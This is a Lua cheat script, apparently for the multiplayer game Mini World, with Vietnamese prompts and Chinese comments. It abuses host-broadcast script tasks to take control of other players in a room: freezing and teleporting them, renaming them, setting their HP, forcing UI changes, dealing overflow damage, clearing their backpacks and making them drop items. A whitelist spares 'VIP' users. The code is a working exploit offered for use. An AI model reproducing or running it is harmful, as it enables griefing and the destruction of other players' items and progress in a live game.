    ShowTextInputSafe(function(text)
        if text == "" then
            ShowGameTipsWithoutFilter("#cFF0000Chữ không được để trống")
            return
        end
        
        local myUin = AccountManager:getUin()
        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
        local count = 0
        
        for i = 1, size do
            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
            if targetPlayer then
                local targetUin = targetPlayer:getUin()
                if targetUin ~= myUin then
                    if not whitelist[targetUin] then
                        local tdata = {
                            [1] = "graphics",
                            [2] = "createGraphicsTxtByActor",
                            [3] = {
                                targetUin,
                                {
                                    title = "#cFFAAFF" .. text,
                                    fontsize = 25,
                                    apha = 5,
                                    itype = 2,
                                    Type = 'GRAPHICS.GRAPHICS_HORNBOOK'
                                },
                                { x = 0, y = 70, z = 0 },
                                1.5,
                                0,
                                115
                            }
                        }
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        count = count + 1
                    end
                end
            end
        end
        ShowGameTipsWithoutFilter("#c00ff00Đã tạo chữ '" .. text .. "' trên đầu " .. count .. " người chơi")
    end, "Nhập chữ hiển thị trên đầu (ví dụ: VUA, BOSS, ADMIN)")
end


function clearTextAll()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local count = 0
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                local tdata = {
                    [1] = "graphics",
                    [2] = "clearGraphicsByActor",
                    [3] = {targetUin}
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                count = count + 1
            end
        end
    end
    ShowGameTipsWithoutFilter("#c00ff00Đã xóa chữ trên đầu của " .. count .. " người chơi")
end

function giveTextTarget()
    ShowPlayerList(function(targetUin)
        if whitelist[targetUin] then
            ShowGameTipsWithoutFilter("Cấm sử dụng với VIP", 3)
            return
        end
        
        ShowTextInputSafe(function(text)
            if text == "" then
                ShowGameTipsWithoutFilter("#cFF0000Chữ không được để trống")
                return
            end
            
            local tdata = {
                [1] = "graphics",
                [2] = "createGraphicsTxtByActor",
                [3] = {
                    targetUin,
                    {
                        title = "#cFFAAFF" .. text,
                        fontsize = 25,
                        apha = 5,
                        itype = 2,
                        Type = 'GRAPHICS.GRAPHICS_HORNBOOK'
                    },
                    { x = 0, y = 70, z = 0 },
                    1.5,
                    0,
                    115
                }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            ShowGameTipsWithoutFilter("#c00ff00Đã tạo chữ '" .. text .. "' trên đầu người chơi " .. targetUin)
        end, "Nhập chữ hiển thị trên đầu")
    end, "Chọn người chơi cần tạo chữ trên đầu")
end
function xepBacThang1()
    -- Đóng dialog cũ nếu có
    pcall(function() GetInst("MessageBoxInterface"):Close() end)
    
    -- Hiển thị input để nhập ID người chơi
    ShowTextInputSafe(function(inputText)
        local targetUin = tonumber(inputText)
        
        if not targetUin or targetUin <= 1000 then
            ShowGameTipsWithoutFilter("#cFF0000ID không hợp lệ! Phải là số > 1000")
            return
        end
        
        -- Kiểm tra whitelist
        if whitelist[targetUin] then
            ShowGameTipsWithoutFilter("Cấm sử dụng với VIP", 3)
            return
        end
        
        -- Kiểm tra người chơi có tồn tại không
        local found = false
        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
        for i = 1, size do
            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
            if targetPlayer then
                local uin = targetPlayer:getUin()
                if uin == targetUin then
                    found = true
                    break
                end
            end
        end
        
        if not found then
            ShowGameTipsWithoutFilter("#cFF0000Không tìm thấy người chơi với ID: " .. targetUin)
            return
        end
        
        -- Reset biến
        _G.stairLoop = false
        
        -- Hiển thị dialog điều khiển
        GetInst("MessageBoxInterface"):dualBtnBox(
            "Bên trái DỪNG BẾ\nBên phải BẮT ĐẦU BẾ",
            "Bế người chơi: " .. targetUin,
            nil,
            function(userData, btnType)
                if btnType == 0 then
                    _G.stairLoop = false
                    
                    -- Mở khóa di chuyển cho người bị bế
                    local tdata = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 1, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    end)
                    
                    ShowGameTipsWithoutFilter("#cFF0000Đã dừng bế người chơi: " .. targetUin)
                    
                elseif btnType == 1 then
                    _G.stairLoop = true
                    ShowGameTipsWithoutFilter("#c00ffffĐang bế người chơi: " .. targetUin .. " lên đầu...")
                    
                    threadpool:work(function()
                        while _G.stairLoop do
                            -- Lấy vị trí của mình
                            local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                            local cx, cy, cz = x / 100, y / 100, z / 100
                            
                            -- Đặt người chơi lên đầu mình (cao hơn 1.5 đơn vị)
                            local px = cx
                            local py = cy + 1.5  -- Độ cao trên đầu
                            local pz = cz
                            
                            -- Tele người chơi lên đầu
                            local tdata1 = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, py, pz}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
                            end)
                            
                            -- Cấm di chuyển người bị bế
                            local tdata2 = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 1, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                            end)
                            
                            threadpool:wait(0.05)  -- Cập nhật nhanh
                        end
                        
                        -- Khi dừng: mở khóa di chuyển
                        local tdata = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 1, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end)
                        
                        ShowGameTipsWithoutFilter("#cFF0000Đã dừng bế " .. targetUin)
                    end)
                end
            end
        )
    end, "Nhập ID người chơi cần bế")
end
function xepBacThang()
    -- Đóng dialog cũ nếu có
    pcall(function() GetInst("MessageBoxInterface"):Close() end)
    
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local players = {}
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    -- Reset biến
    _G.stairLoop = false
    
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái DỪNG\nBên phải BẮT ĐẦU",
        "Bậc thang + đóng băng",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.stairLoop = false
                
                for _, targetUin in ipairs(players) do
                    local tdata = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 1, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    end)
                end
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
                
            elseif btnType == 1 then
                _G.stairLoop = true
                ShowGameTipsWithoutFilter("#c00ffffĐang xếp bậc thang...")
                
                threadpool:work(function()
                    local khoangCachNgang = 2.5
                    local khoangCachDoc = 2.5
                    local soNguoiMoiBac = 2
                    
                    while _G.stairLoop do
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local cx, cy, cz = x / 100, y / 100, z / 100
                        
                        for i, targetUin in ipairs(players) do
                            if not _G.stairLoop then break end  -- THÊM DÒNG NÀY
                            
                            local index = i - 1
                            local bac = math.floor(index / soNguoiMoiBac)
                            local viTriTrongBac = index % soNguoiMoiBac
                            
                            local offsetX = (viTriTrongBac - 0.5) * khoangCachNgang
                            local offsetY = bac * khoangCachDoc + 1
                            
                            local px = cx + offsetX
                            local py = cy + offsetY
                            local pz = cz
                            
                            local tdata1 = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, py, pz}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
                            end)
                            
                            local tdata2 = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 1, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                            end)
                        end
                        
                        threadpool:wait(0.05)
                    end
                end)
            end
        end
    )
end
_G.rotateLoop = false

function circleFormationRotate()
    -- Đóng dialog cũ nếu có
    pcall(function() GetInst("MessageBoxInterface"):Close() end)
    
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local cx, cy, cz = x / 100, y / 100, z / 100
    local radius = 8
    local players = {}
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    -- Reset biến
    _G.rotateLoop = false
    
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái DỪNG\nBên phải BẮT ĐẦU QUAY",
        "Vòng tròn xoay",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.rotateLoop = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
                
            elseif btnType == 1 then
                _G.rotateLoop = true
                ShowGameTipsWithoutFilter("#c00ffffĐang xoay...")
                
                threadpool:work(function()
                    local angleOffset = 0
                    
                    while _G.rotateLoop do
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local cx, cy, cz = x / 100, y / 100, z / 100
                        
                        for idx, targetUin in ipairs(players) do
                            if not _G.rotateLoop then break end  -- THÊM DÒNG NÀY
                            
                            local angle = (idx / #players) * 2 * math.pi + angleOffset
                            local px = cx + radius * math.cos(angle)
                            local pz = cz + radius * math.sin(angle)
                            
                            local tdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, cy + 1, pz}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end)
                        end
                        
                        angleOffset = angleOffset + 0.1
                        threadpool:wait(0.05)
                    end
                end)
            end
        end
    )
end

function stopAllRotate()
    _G.rotateLoop = false
    _G.rotateSpeedLoop = false
    _G.rotateBounceLoop = false
    _G.rotatePulseLoop = false
    _G.rotateReverseLoop = false
    _G.rotateLightningLoop = false
    ShowGameTipsWithoutFilter("#cFF0000Đã dừng TẤT CẢ vòng tròn xoay")
end
-- Nút dừng riêng
stopRotate = function()
    _G.rotateLoop = false
    ShowGameTipsWithoutFilter("#cFF0000Đã dừng vòng tròn xoay")
end

function dffz()
local myUin = AccountManager:getUin()
local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
for i = 1, size do
    local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
    if targetPlayer then
        local targetUin = targetPlayer:getUin()
        if targetUin ~= myUin then
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "changPlayerMoveType";
           tdata[3] = {targetUin,0}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "world";
           tdata[2] = "SetTimeVanishingSpeed";
           tdata[3] = {500}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "changeViewMode";
           tdata[3] = {targetUin,9,true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "forceOpenBoxUI";
           tdata[3] = {targetUin,797}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "changeCustomModel";
           tdata[3] = {targetUin,[=[role_11]=]}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "chat";
           tdata[2] = "sendChat";
           tdata[3] = {"#b#BHaiCa",1,0}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "notifyGameInfo2Self";
           tdata[3] = {targetUin,"#b#BHaiCa"}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "setnickname";
           tdata[3] = {targetUin,"#b#BHaiCa"}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "backpack";
           tdata[2] = "clearAllPack";
           tdata[3] = {targetUin}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "setActionAttrState";
           tdata[3] = {targetUin,1,false}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "setActionAttrState";
           tdata[3] = {AccountManager:getUin(),64,false}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            tdata = {}
           tdata[1] = "player";
           tdata[2] = "setActionAttrState";
           tdata[3] = {AccountManager:getUin(),128,false}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "world";
           tdata[2] = "SetSkyBoxMaps";
           tdata[3] = {1,30008,""}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playerHurt";
           tdata[3] = {AccountManager:getUin(),targetUin,1.8e+308,0}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "player";
           tdata[2] = "setAtt";
           tdata[3] = {targetUin,1,2}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"yanhua",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"12834",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"bossskill_lasertailblue",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"ice_bingshi_boss",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"mob_3514_white",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"nengliang_xiqu",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {AccountManager:getUin(),"nengliang_baozha",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
           tdata = {}
           tdata[1] = "actor";
           tdata[2] = "playBodyEffectByFile";
           tdata[3] = {targetUin,"jiguang01",true}
           ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
       end
     end
	end

function didyskibi()
       local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    
    ShowTextInputSafe(function(text)
        local newName = text
        if newName == "" then
            ShowGameTipsWithoutFilter("#cFF0000Tên không được để trống")
            return
        end
        
        local count = 0
        for i = 1, size do
            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
            if targetPlayer then
                local targetUin = targetPlayer:getUin()
                if targetUin ~= myUin then
                    local tdata = {}
                    tdata[1] = "actor"
                    tdata[2] = "setnickname"
                    tdata[3] = {targetUin, newName}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    count = count + 1
                end
            end
        end
        ShowGameTipsWithoutFilter("#c00ff00Đã đổi tên " .. count .. " người chơi thành: " .. newName)
    end, "Nhập tên mới cho toàn phòng")
end

function setAllHP()
    ShowTextInputSafe(function(text)
        local hp = tonumber(text)
        if not hp then
            ShowGameTipsWithoutFilter("#cFF0000Nhập số HP hợp lệ")
            return
        end
        
        local myUin = AccountManager:getUin()
        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
        local count = 0
        
        for i = 1, size do
            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
            if targetPlayer then
                local targetUin = targetPlayer:getUin()
                if targetUin ~= myUin then
                    local tdata1 = {}
                    tdata1[1] = "player"
                    tdata1[2] = "setAtt"
                    tdata1[3] = {targetUin, hp, 1}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
                    
                    local tdata2 = {}
                    tdata2[1] = "player"
                    tdata2[2] = "setAtt"
                    tdata2[3] = {targetUin, hp, 2}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                    count = count + 1
                end
            end
        end
        ShowGameTipsWithoutFilter("#c00ff00Đã set HP = " .. hp .. " cho " .. count .. " người chơi")
    end, "Nhập số HP (ví dụ: 100)")
end

function throwAllUp()
    local myUin = AccountManager:getUin()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local cx, cz = x / 100, z / 100
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local height = 0
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                height = height + 3
                local tdata = {}
                tdata[1] = "player"
                tdata[2] = "setPosition"
                tdata[3] = {targetUin, cx + math.random(-2, 2), height, cz + math.random(-2, 2)}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
    ShowGameTipsWithoutFilter("#c00ff00Đã ném tất cả người chơi lên trời")
end

-- ==================== 复杂功能函数 ====================
function fsjg()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng laser\nBên phải bật laser",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            _G.ztmn_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Laser đã dừng")
            
        elseif btnType == 1 then  -- 右边按钮：开启
            _G.ztmn_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffLaser đã bật - từ mọi hướng")
            
            -- 启动炸图循环
            threadpool:work(function()
                while _G.ztmn_enabled do
                    -- 获取自己当前位置
                    local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                    local center_x = my_x / 100
                    local center_y = my_y / 100
                    local center_z = my_z / 100
                    
                    -- 向四面八方发射（8个方向）
                    for angle = 0, 315, 45 do  -- 0°, 45°, 90°, 135°, 180°, 225°, 270°, 315°
                        local rad = math.rad(angle)  -- 角度转弧度
                        
                        -- 计算目标位置（距离50-100格）
                        local distance = math.random(50, 100)
                        local target_x = center_x + math.cos(rad) * distance
                        local target_z = center_z + math.sin(rad) * distance
                        local target_y = center_y
                        
                        -- 发射投掷物（从自己位置射向目标）
                        local tdata = {
                            [1] = "world",
                            [2] = "spawnProjectile",
                            [3] = {
                                AccountManager:getUin(),
                                15509,  -- 火龙果ID
                                center_x, center_y + 2, center_z,  -- 发射位置（自己位置稍微抬高）
                                target_x, target_y, target_z,       -- 目标位置
                                500
                            }
                        }
                        
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                    end
                    
                    threadpool:wait(0.2)  -- 0.2秒发射一轮
                end
            end)
        end
    end
)
end


function bf1()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/096d816716f4f311fd3a78d9f2dfd3fc.mp3", 0)
end

function bf2()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/08d4196d5ad306c7505159a4113ad549.mp3", 0)
end

function bf3()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/1c77ceb3251448c5c1f656939f9e490b.mp3", 0)
end

function bf4()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/9917f2147a24fff85a81ff5ef7428f13.mp3", 0)
end

function bf5()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/47c70e475c8d9ef84999596ad6b6e33c.mp3", 0)
end

function bf6()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/8038415b8214f96d21b9c5fdbcae9fcc.mp3", 0)
end


function bf7()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/5c889ce89b6a26bbd4337c43782af86a.mp3", 0)
end


function bf8()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/e31825397524e0557521d76f9a167170.mp3", 0)
end

function bf9()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/50c7531b5b188a2acd31ae8b7da5efdf.mp3", 0)
end


function bf10()
QQMusicPlayerIns:PlayMusicOperate("http://www.cccimg.com/view.php/79042f40a3b2a2c8dae775669a859aff.mp3", 0)
end


function zxkz()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 控位+禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng điều khiển vị trí\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止控位 =====
            _G.control_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng điều khiển vị trí")
            
            -- ===== 恢复所有被控玩家的移动 =====
            threadpool:work(function()
                threadpool:wait(0.1)
                -- 这里需要记录被控的玩家UIN，简单起见先遍历所有玩家
                local uin_list = GetPlayerUinList()
                for _, uin in ipairs(uin_list) do
                    local moveTdata = {
                        [1] = "actor",
                        [2] = "setActionAttrState",
                        [3] = { uin, _G.PLAYERATTR.ENABLE_MOVE, true }  -- true = 恢复移动
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                    end)
                end
                ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục di chuyển cho tất cả người chơi")
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启控位 =====
            _G.control_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.control_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list <= 1 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.control_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu điều khiển vị trí",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần điều khiển vị trí")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu điều khiển vị trí")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                if whitelist and whitelist[targetUin] then
                    ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                    _G.control_enabled = false
                    return
                end
                ---=== 白名单检查结束 ===---
                
                -- ===== 禁止目标玩家移动 =====
                local moveTdata = {
                    [1] = "actor",
                    [2] = "setActionAttrState",
                    [3] = { targetUin, _G.PLAYERATTR.ENABLE_MOVE, false }  -- false = 禁止移动
                }
                pcall(function() 
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                end)
                -- ============================
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn mục tiêu:" .. targetUin .. ", bắt đầu vòng lặp điều khiển vị trí (tâm ngắm chỉ đâu, người đó sẽ tới đó; đã cấm di chuyển)")
                
                -- 启动控位循环
                threadpool:work(function()
                    local loopCount = 0
                    local myUin = AccountManager:getUin()
                    
                    while _G.control_enabled do
                        loopCount = loopCount + 1
                        
                        -- 获取自己的准心位置
                        InitGameAPI()
                        GameVmTriggerInit()
                        local ret, aimX, aimY, aimZ = GameVM.Player:getAimPos(myUin)
                        
                        if ret == ErrorCode.OK then
                            -- 将目标玩家传送到准心位置
                            local posTdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, aimX, aimY, aimZ}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, posTdata) 
                            end)
                            
                            -- 每50次重新确认禁止移动（防止被恢复）
                            if loopCount % 50 == 0 then
                                local moveTdata = {
                                    [1] = "actor",
                                    [2] = "setActionAttrState",
                                    [3] = { targetUin, _G.PLAYERATTR.ENABLE_MOVE, false }
                                }
                                pcall(function() 
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, moveTdata) 
                                end)
                            end
                            
                            -- 每100次显示一次提示
                            if loopCount % 100 == 0 then
                                ShowGameTipsWithoutFilter("#cFFAA00Đang điều khiển vị trí... Mục tiêu:" .. targetUin .. " Vị trí:" .. string.format("%.1f,%.1f,%.1f", aimX, aimY, aimZ))
                            end
                        else
                            if loopCount % 50 == 0 then
                                ShowGameTipsWithoutFilter("#cFF0000Không thể lấy vị trí tâm ngắm")
                            end
                        end
                        
                        -- 极速更新
                        threadpool:wait(0.01)  -- 每0.01秒更新一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp điều khiển vị trí đã kết thúc")
                end)
            end
            -- ====================
        end
    end
)
end
                    



function dtms()

ShowPlayerList(function(uin)
    
    for i=1000, 9000 do
grid_index=i
        tdata = {}
    tdata[1] = "backpack";
    tdata[2] = "discardItem";
    tdata[3] = {uin,grid_index,1}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
    end, "Người chơi ném đồ")
end


function kzyd()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 速度控制功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng điều khiển tốc độ\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止速度控制 =====
            _G.sd_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng điều khiển tốc độ")
            
            -- 恢复所有玩家速度
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.sd_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "actor"
                            tdata[2] = "appendSpeed"
                            tdata[3] = {briefInfo.uin, 0, 0, 0}  -- 0,0,0 = 停止移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục tốc độ cho tất cả người chơi")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启速度控制 =====
            _G.sd_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.sd_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
